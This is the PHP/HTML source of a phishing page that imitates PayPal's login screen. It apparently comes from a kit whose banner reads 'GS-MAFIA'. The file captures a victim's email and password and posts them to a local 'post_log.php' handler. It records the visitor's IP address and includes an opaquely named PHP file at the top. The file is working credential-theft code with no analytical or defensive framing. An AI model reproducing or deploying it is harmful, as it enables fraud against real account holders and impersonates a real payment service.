<?php include_once'../../02f5c794f8e62115216710ab8d38aa0f.php';?><?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("languages/index.php");
include("settings/gs_config.php");
include ("languages/lang".$_SESSION['gs_langlink']);
$_SESSION['gs_ip'] = getclientip();
?>
<html class=" desktop js ">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<title><?php echo $gs_string39 ?></title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="stylesheet" href="css/gs_login.css">
	<script type="text/javascript" src="js/jquery.js"></script>
</head>
<body class="desktop">
	<div id="main" class="main" role="main">
		<section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
			<div class="corral">
				<div class="contentContainer activeContent contentContainerBordered">
					<header>
						<p class="paypal-logo paypal-logo-long">
						</p>
					</header>
					<form method="POST" action="settings/includes/post_log.php" class="proceed maskable" autocomplete="off" name="login" id="gs_form" novalidate="">
						<div id="gs_13_2">
							<div id="gs_13_3">
								<div class="profileRememberedEmail"><span class="profileDisplayPhoneCode"></span><span id="profileDisplayEmail" class="profileDisplayEmail"></span><a onclick="change();" onmouseover="this.style.cursor='pointer'" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1"><?php echo $gs_string10 ?></a></div>
							</div>
							<input type="text" style="display: none;" value="" name="gs_email" id="gs_email">

							<div id="splitPassword" class="splitPassword transformRightToLeft">
								<div id="splitPasswordSection" class="">
									<div id="passwordSection" class="clearfix">
										<div class="textInput" id="login_passworddiv" style="z-index: 1;">
											<div class="fieldWrapper">
												<input name="gs_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="<?php echo $gs_string32 ?>" aria-describedby="passwordErrorMessage">
												</div>
										</div>
									</div>
								</div>
								<div class="actions">
									<button class="button actionContinue" type="submit" value="Login" pa-marked="1"><?php echo $gs_string11 ?></button>
								</div>
							</div>
						</div>
					</form>
					<div id="gs_13">
						<div id="splitEmail" class="splitEmail">
							<div id="splitEmailSection">
								<div id="emailSection" class="clearfix">
									<div class="textInput" id="login_emaildiv" style="z-index: 1;">
										<div class="fieldWrapper">
											<input id="gs_email_1" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="off" placeholder="<?php echo $gs_string1 ?>">
										</div>
									</div>
								</div>
							</div>
							<div class="actions">
								<button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" onclick="Nextgs();"><?php echo $gs_string2 ?></button>
							</div>
						</div>
					</div>	
					<div class="forgotLink"><a href="#" class="pwrLink"><?php echo $gs_string3 ?></a></div>
					<div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
						<div class="loginSignUpSeparator">
							<span class="textInSeparator"><?php echo $gs_string4 ?></span>
						</div>
						<a class="button secondary" id="createAccount"><?php echo $gs_string5 ?></a>
					</div>
				</div>
			</div>
		</section>
		<footer class="footer" role="contentinfo">
			<div class="legalFooter">
				<ul class="footerGroup">
					<li><a href="#"><?php echo $gs_string6 ?></a></li>
					<li><a href="#"><?php echo $gs_string7 ?></a></li>
					<li><a href="#"><?php echo $gs_string8 ?></a></li>
					<li><a href="#"><?php echo $gs_string9 ?></a></li>
				</ul>
			</div>
		</footer>
		<div id="gs_load">
		<div id="gs_loading"></div>
		<div id="gs_overlay"></div>
		</div>
	</div>
</body>
<script type="text/javascript" src="js/login.js"></script>
</html>
